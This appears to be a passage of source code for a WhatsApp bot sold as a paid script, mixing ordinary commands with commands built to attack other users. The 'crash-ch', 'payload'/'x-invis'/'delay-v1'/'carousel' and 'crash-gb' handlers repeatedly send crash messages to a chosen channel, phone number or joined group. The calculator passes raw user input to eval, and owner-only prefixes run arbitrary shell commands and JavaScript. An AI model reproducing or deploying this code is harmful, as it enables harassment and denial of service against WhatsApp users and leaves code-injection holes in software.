            if (!isOwner) return reply('`𝗞𝗵𝘂𝘀𝘂𝘀 𝗢𝘄𝗻𝗲𝗿 𝗝𝗶𝗿`');
                if (!text) return reply(`\n*Ex:* ${command} Impossible\n`)
                reply(`*\`𝐖𝐀𝐈𝐓 𝐒𝐄𝐃𝐀𝐍𝐆 𝐌𝐄𝐍𝐂𝐀𝐑𝐈...\`*`)
                let mbut = await fetchJson(`https://ochinpo-helper.hf.space/yt?query=${text}`)
                let ahh = mbut.result
                let crot = ahh.download.audio

                Joo.sendMessage(m.chat, {
                    audio: { url: crot },
                    mimetype: "audio/mpeg", 
                    ptt: true
                }, { quoted: qchannel })
            }
            break
case 'brat': {
  if (!text) return reply("𝗜𝗻𝗽𝘂𝘁 𝗬𝗼𝘂𝗿 𝗧𝗲𝘅𝘁");

  async function brat(text) {
    try {
      const axios = require('axios');
      const res = await axios.get("https://brat.caliphdev.com/api/brat", {
        params: { text },
        responseType: "arraybuffer"
      });
      const image = Buffer.from(res.data);
      if (image.length <= 10240) throw new Error("Gagal generate brat");
      return image;
    } catch (e) {
      throw new Error(e.message || "Error tidak dikenal");
    }
  }

  try {
    const buf = await brat(text);
    const { writeFile } = require("fs/promises");
    const { Sticker } = require("wa-sticker-formatter");
    const tempFile = "./temp-brat.png";

    await writeFile(tempFile, buf);

    const sticker = new Sticker(tempFile, {
      pack: global.footer,
      author: "ᴊᴏᴏxʙᴏᴛᴢ ᴅᴇᴠᴇʟᴏᴘᴇʀ",
      type: "full",
      categories: ['😎'],
    });

    await Joo.sendMessage(m.chat, await sticker.toMessage());
  } catch (e) {
    reply(`Error: ${e.message}`);
  }
}
break
case 'addbuyyer': {
  if (!isOwner) return reply('Fitur ini hanya untuk owner!');

  if (!q) return reply('Format: .addbuyyer 628xxxx,Produk A,10000');
  const [wa, produk, harga] = q.split(',').map(a => a.trim());
  if (!wa || !produk || !harga) return reply('Pastikan semua data diisi: wa, produk, dan harga!');

  const fs = require('fs');
  const filePath = './data/test.json';

  let data = [];
  if (fs.existsSync(filePath)) {
    data = JSON.parse(fs.readFileSync(filePath));
  }

  data.push({
    wa, produk, harga: parseInt(harga), tanggal: new Date().toLocaleString()
  });

  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
  reply(`Berhasil menambahkan:\n• Contact: ${wa}\n• Produk: ${produk}\n• Harga: Rp${harga}`);
}
break;
case 'rekapbuyyer': {
  if (!isOwner) return reply('Fitur ini hanya untuk owner!');

  const fs = require('fs');
  const filePath = './data/test.json';

  if (!fs.existsSync(filePath)) return reply('Belum ada data pembeli.');

  let data = JSON.parse(fs.readFileSync(filePath));
  if (data.length === 0) return reply('Data pembeli masih kosong.');

  let teks = `*[ \`Rekap Buyyer\` ]*\n\n`;
  data.forEach((item, i) => {
    teks += `*${i + 1}.*\n`;
    teks += `• Contact: ${item.wa}\n`;
    teks += `• Produk: ${item.produk}\n`;
    teks += `• Harga: Rp${item.harga}\n`;
    teks += `• Tanggal: ${item.tanggal}\n\n`;
  });

  reply(teks.trim());
}
break;
case 'kalkulator':
case 'calc': {
  if (!q) return reply('Contoh: .kalkulator 100+200*(2-1)');

  try {
    let hasil = eval(q.replace(/\^/g, '**'));
    reply(`*Hasil Kalkulasi:*\n${q} = *${hasil}*`);
  } catch (e) {
    reply('Format salah atau ekspresi tidak valid!');
  }
}
break;
case "delprem":{
    if (!isOwner) return reply("𝗔𝗸𝘀𝗲𝘀 𝗽𝗿𝗲𝗺𝗶𝘂𝗺 𝗮𝗻𝗱𝗮 𝘁𝗲𝗹𝗮𝗵 𝗱𝗶𝗰𝗮𝗯𝘂𝘁")
             if (!args[0]) return reply(`Example Use :\n${prefix+command} 62xxx`)
             let ya = q.split("|")[0].replace(/[^0-9]/g, '')
             let no = '@s.whatsapp.net'
             let unp = Premium.indexOf(ya)
Premium.splice(unp, 1)
fs.writeFileSync("./data/murbug.json", JSON.stringify(Premium))
reply(`BUKAN PREMIUM LAGI ${ya}`)
}
break
case 'done': {
  if (!q.includes(',')) return reply(`Contoh:\n.done Panel Unli,5000`);
  
  let [nama, harga] = q.split(',');
  let toko = 'JooCloudID [MarketPlace]';
  let url = 'https://whatsapp.com/channel/0029VbA8EL0DjiOguK9AA30X';
  let waktu = new Date().toLocaleString('id-ID');

  let teks = `*✅ Done Order*\n*Barang:* ${nama}\n*Harga:* Rp${Number(harga).toLocaleString('id-ID')}\n\n*${toko}*\n${url}\n🕒 ${waktu}`;

  await Joo.sendMessage(m.chat, {
    text: teks,
    contextInfo: {
      externalAdReply: {
        title: toko,
        body: "Pesananmu telah diproses!",
        thumbnailUrl: "https://img1.pixhost.to/images/4990/587347702_joocloud.jpg", // bisa diganti
        mediaType: 1,
        renderLargerThumbnail: true,
        showAdAttribution: true,
        sourceUrl: url
      }
    }
  }, { quoted: qchannel });
}
break;
case "rvo": {
if (!isOwner) return reply('`𝗕𝘂𝗮𝘁 𝗢𝘄𝗻𝗲𝗿 𝗗𝗼𝗮𝗻𝗴`');
if (!m.quoted) return reply(
`*❌Syntax Error!!*
*Example:* Reply ViewOnce with caption ${command}`);
try {
let buffer = await m.quoted.download();
let type = m.quoted.mtype;
let sendOptions = { quoted: m };
if (type === "videoMessage") {
await Joo.sendMessage(m.chat, { video: buffer, caption: m.quoted.text || "" }, sendOptions);
} else if (type === "imageMessage") {
await Joo.sendMessage(m.chat, { image: buffer, caption: m.quoted.text || "" }, sendOptions);
} else if (type === "audioMessage") {
await Joo.sendMessage(m.chat, { 
audio: buffer, 
mimetype: "audio/mpeg", 
ptt: m.quoted.ptt || false 
}, sendOptions);
} else {
return reply("❌ Media View Once tidak didukung.");
}} catch (err) {
console.error(err)}}
break;
case "sticker": case "stiker": case "sgif": case "s": {
if (!/image|video/.test(mime)) return reply(example("dengan mengirim foto/vidio"))
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return reply("Durasi vidio maksimal 15 detik!")
}
reply(msg.wait)
var media = await Joo.downloadAndSaveMediaMessage(qmsg)
await Joo.sendStimg(m.chat, media, m, {packname: "ᴊᴏᴏxʙᴏᴛᴢ ᴅᴇᴠᴇʟᴏᴘᴇʀ"})
await fs.unlinkSync(media)
}
break
case 'owner': case "joodev": {
    Joo.sendMessage(m.chat, { react: { text: "👤", key: m.key } });

    let menu = `
𝗢𝘄𝗻𝗲𝗿 𝗖𝗼𝗻𝘁𝗮𝗰𝘁👤
*👋 𝗛𝗶 𝗞𝗮𝗸/𝗕𝗮𝗻𝗴*
𝗞𝗼𝗻𝘁𝗮𝗸 𝗸𝗿𝗲𝗮𝘁𝗼𝗿 𝗮𝗱𝗮 𝗱𝗶 𝘁𝗼𝗺𝗯𝗼𝗹 𝗱𝗶𝗯𝗮𝘄𝗮𝗵
𝗠𝗼𝗵𝗼𝗻 𝗷𝗮𝗻𝗴𝗮𝗻 𝘀𝗽𝗮𝗺/𝘁𝗲𝗹𝗽𝗼𝗻 𝘆𝗮𝗮, 𝗝𝗮𝗻𝗴𝗮𝗻 𝗹𝘂𝗽𝗮 𝗳𝗼𝗹𝗹𝗼𝘄 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗻𝘆𝗮.
    `;

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: {
                        mentionedJid: [m.sender], 
                        isForwarded: true, 
                        forwardedNewsletterMessageInfo: {
                            newsletterName: `𝗜𝗻𝗳𝗼 𝗨𝗽𝗱𝗮𝘁𝗲 Fragment`,
                            newsletterJid: "120363417288913995@newsletter",
                            serverMessageId: 143
                        },
                        businessMessageForwardInfo: { businessOwnerJid: Joo.decodeJid(Joo.user.id) },
                    }, 
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: menu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "ᴊᴏᴏᴄʟᴏᴜᴅɪᴅ"
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"ᴏᴡɴᴇʀ\",\"url\":\"https://wa.me/6283196543913\",\"merchant_url\":\"https://wa.me/6283196543913\"}`
                            },
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"sᴀʟᴜʀᴀɴ ᴅᴇᴠ\",\"url\":\"https://whatsapp.com/channel/0029VbA8EL0DjiOguK9AA30X\",\"merchant_url\":\"https://wa.me/6283196543913\"}`
                            }
                        ],
                    })
                })
            }
        }
    }, {});

    await Joo.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;
case "kill-ch":
case "crash-ch": {
    if (!isOwner) return reply("⚠️ Hanya owner yang bisa menggunakan perintah ini!");

    const targetChannel = args[0]; // ID Channel (contoh: "120363025161900516@broadcast")
    if (!targetChannel) {
        return reply(`⚠️ Masukkan ID Channel!\n\n📌 Contoh: *.${command} 120363025161900516@broadcast*`);
    }

    // Kirim pesan awal proses
    await Joo.sendMessage(m.chat, {
        image: { url: "https://img1.pixhost.to/images/5002/587463850_joocloud.jpg" },
        caption: "🔄 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗯𝘂𝗴 𝗸𝗲 𝗖𝗵𝗮𝗻𝗻𝗲𝗹...",
        contextInfo: {
            externalAdReply: {
                title: "🚀 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀...",
                body: "𝗕𝘂𝗴𝗴𝗶𝗻𝗴 𝗯𝘆 𝗝𝗼𝗼𝗖𝗹𝗼𝘂𝗱𝗜𝗗 V4",
                sourceUrl: "https://whatsapp.com/channel/0029VbA8EL0DjiOguK9AA30X",
            },
        },
    });

    const total = 2000;

    for (let i = 0; i < total; i++) {
        try {
            await CrashJids(targetChannel);

            if (i === 10) {
                // Kirim pesan progress setelah beberapa iterasi
                await Joo.sendMessage(m.chat, {
                    text: `⏳ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴... (${i}/${total})`,
                });
            }
        } catch (error) {
            console.error("❌ Gagal mengirim ke Channel:", error);
            return reply("⚠️ Terjadi kesalahan saat mengirim ke Channel.");
        }
        await sleep(1000); // Jeda agar tidak overload
    }

    // Kirim pesan selesai
    await Joo.sendMessage(m.chat, {
        image: { url: "https://img1.pixhost.to/images/5002/587463850_joocloud.jpg" },
        caption: "✅ 𝗕𝘂𝗴 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗗𝗶𝗸𝗶𝗿𝗶𝗺 𝗸𝗲 𝗖𝗵𝗮𝗻𝗻𝗲𝗹!",
        contextInfo: {
            externalAdReply: {
                title: "Fragment🐣",
                body: "𝗗𝗼𝗻𝗲 𝗯𝘆 FragmentX.I V1",
                sourceUrl: "https://whatsapp.com/channel/0029VbA8EL0DjiOguK9AA30X",
            },
        },
    });

    reply("✅ 𝗣𝗿𝗼𝘀𝗲𝘀 𝗕𝘂𝗴 𝗧𝗲𝗹𝗮𝗵 𝗦𝗲𝗹𝗲𝘀𝗮𝗶!");
}
break;
case "payload":
case "x-invis":
case "delay-v1":
case "carousel": {
    if (!isOwner && !isPremium) return reply("𝗞𝗵𝘂𝘀𝘂𝘀 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗗𝗮𝗻 𝗢𝘄𝗻𝗲𝗿");

    if (!text) {
        return await Joo.sendMessage(m.chat, { text: `*ᴄᴏɴᴛᴏʜ: .${command} 𝟼𝟸xx*` });
    }

    const target = text.trim();

    if (!target || isNaN(target)) {
        return await Joo.sendMessage(m.chat, { text: "ᴛᴀʀɢᴇᴛ ᴠᴀʟɪᴅ" });
    }

    const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const check = await Joo.onWhatsApp(org.split("@")[0]);

    if (!check[0]?.exists) {
        return await Joo.sendMessage(m.chat, { text: "ᴛᴀʀɢᴇᴛ ᴠᴀʟɪᴅ" });
    }

    // Kirim pesan awal proses
    await Joo.sendMessage(m.chat, {
        image: { url: "https://img1.pixhost.to/images/5002/587463850_joocloud.jpg" },
        caption: "𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴...",
        contextInfo: {
            externalAdReply: {
                title: `𝗙𝗿𝗮𝗴𝗺𝗲𝗻𝘁𝗫.𝗜 𝗩𝟭`,
                body: "𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀",
                sourceUrl: "https://whatsapp.com/channel/0029VbA8EL0DjiOguK9AA30X",
            },
        },
    });

    const total = 2000;

    for (let i = 0; i < total; i++) {
        if (i === 10) {
            // Kirim pesan selesai di chat tempat perintah diketik
            await Joo.sendMessage(m.chat, {
                image: { url: "https://files.catbox.moe/uymy5d.jpg" },
                caption: `✅ 𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴...`,
                contextInfo: {
                    externalAdReply: {
                        title: `© 𝗙𝗿𝗮𝗴𝗺𝗲𝘁𝗫.𝗜`,
                        body: "𝗗𝗼𝗻𝗲 𝗯𝘂𝗴 𝗯𝘆 𝗙𝗿𝗮𝗴𝗺𝗲𝗻𝘁𝗫.𝗜",
                        sourceUrl: "https://whatsapp.com/channel/0029VbA8EL0DjiOguK9AA30X",
                    },
                },
            });
        }
     
    await protocolbug(org, [org]);
    Crashed(`${org}`);       
    Systemjoov2(Joo, org);  
    carousel(Joo, org);  
    trashinfinity(`${org}`);
    await VPen(org, true);
        await sleep(1000);
    }
}
break;
case "crash-gb": {
    if (!isOwner && !isPremium) return reply("𝗞𝗵𝘂𝘀𝘂𝘀 𝗢𝘄𝗻𝗲𝗿 / 𝗣𝗿𝗲𝗺𝗶𝘂𝗺");

    if (!text || !text.includes("chat.whatsapp.com")) {
        return reply("⚠️ Kirim *link grup WhatsApp*!\nContoh: .crash-gb https://chat.whatsapp.com/XXXX");
    }

    let linkgc = text.trim();
    let code = linkgc.split("https://chat.whatsapp.com/")[1];

    if (!code) return reply("⚠️ Link grup tidak valid!");

    // Join ke grup
    let res = await Joo.groupAcceptInvite(code).catch(e => reply("❌ Gagal join grup!"));

    let target = res; // ID grup yang berhasil join

    await Joo.sendMessage(m.chat, { text: `✅ Berhasil masuk grup!\nMengirim crash bug ke ${target}` });

    await Joo.sendMessage(target, {
        text: "𝗣𝗿𝗼𝘀𝗲𝘀 𝗞𝗶𝗿𝗶𝗺 𝗖𝗿𝗮𝘀𝗵 𝗕𝘂𝗴...\n𝗕𝘆 𝗝σσ𝗖𝗹σ𝘂𝗱",
        contextInfo: {
            externalAdReply: {
                title: "🔥 Overlimit by FragmentX.I",
                body: "Force crash testing...",
                sourceUrl: "https://whatsapp.com/channel/0029VbA8EL0DjiOguK9AA30X",
            },
        },
    });

    // Kirim fungsi crash ke grup
    for (let i = 0; i < 5; i++) {
        await Systemjoo(Joo, target);      // target grup, bukan m.chat
        await Systemjoov2(Joo, target);    // target grup
        await sleep(1200);
    }

    reply("✅ Done send ke grup target!");
}
break;
case "tourl": {
if (!/image/.test(mime)) return reply(example("𝗥𝗲𝗽𝗹𝘆/𝗞𝗶𝗿𝗶𝗺 𝗙𝗼𝘁𝗼"))
let media = await Joo.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'joocloud.png');

let teks = directLink.toString()
await Joo.sendMessage(m.chat, {text: teks}, {quoted: qchannel})
await fs.unlinkSync(media)
}
break
case 'sc': case "script": {
    Joo.sendMessage(m.chat, { react: { text: "👤", key: m.key } });

    let menu1 = `
𝗦𝗰𝗿𝗶𝗽𝘁 Fragment 𝗩𝟭 𝗗𝗶𝗷𝘂𝗮𝗹\n\n` +
               `*Harga Enc:* 10K\n` +
               `*Harga No Enc:* 20K\n\n` +
               `*Minat? Chat Owner!*
    `;

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: {
                        mentionedJid: [m.sender], 
                        isForwarded: true, 
                        forwardedNewsletterMessageInfo: {
                            newsletterName: `𝗜𝗻𝗳𝗼 𝗨𝗽𝗱𝗮𝘁𝗲 FragmentX.I`,
                            newsletterJid: "120363417288913995@newsletter",
                            serverMessageId: 143
                        },
                        businessMessageForwardInfo: { businessOwnerJid: Joo.decodeJid(Joo.user.id) },
                    }, 
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: menu1
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "ᴊᴏᴏᴄʟᴏᴜᴅɪᴅ"
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"ᴏᴡɴᴇʀ\",\"url\":\"https://wa.me/6283196543913\",\"merchant_url\":\"https://wa.me/6283196543913\"}`
                            },
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"sᴀʟᴜʀᴀɴ ᴅᴇᴠ\",\"url\":\"https://whatsapp.com/channel/0029VbA8EL0DjiOguK9AA30X\",\"merchant_url\":\"https://wa.me/6283196543913\"}`
                            }
                        ],
                    })
                })
            }
        }
    }, {});

    await Joo.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;
case "addprem":{
if (!isOwner) return reply("𝗞𝗵𝘂𝘀𝘂𝘀 𝗢𝘄𝗻𝗲𝗿")
if (!args[0]) return reply(`*\`PENGGUNA :\`* *${command} NOMOR*\n*\`EXAMPLE :\`* *${command} 628XXXX*`)
let prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Joo.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`*\`MOHON MASUKAN NOMOR YG TERDAFTAR\`*`)
Premium.push(prrkek)
fs.writeFileSync("./data/murbug.json", JSON.stringify(Premium))
reply(`*\`SUKSES MENJADI PREMIUM!!\`*`)
}
break
case "listprem": {
  if (!isOwner) return reply("𝗞𝗵𝘂𝘀𝘂𝘀 𝗢𝘄𝗻𝗲𝗿");

  let murbug = JSON.parse(fs.readFileSync("./data/murbug.json"));
  if (murbug.length === 0) return reply("Belum ada nomor yang menjadi premium.");

  let teks = "*DAFTAR NOMOR PREMIUM:*\n\n";
  teks += murbug.map((v, i) => `${i + 1}. wa.me/${v.replace(/@s\.whatsapp\.net$/, "")}`).join("\n");

  reply(teks);
}
break;

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "Ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
reply(jsonData)
} 
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

default:
if ((m.text).startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return Joo.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return Joo.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

if ((m.text).startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return Joo.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return Joo.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

if ((m.text).startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
Joo.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
Joo.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

}} catch (e) {
console.log(e)
Joo.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.cyan("File Update => "),
chalk.cyan.bgBlue.bold(`${__filename}`))
delete require.cache[file]
require(file)
})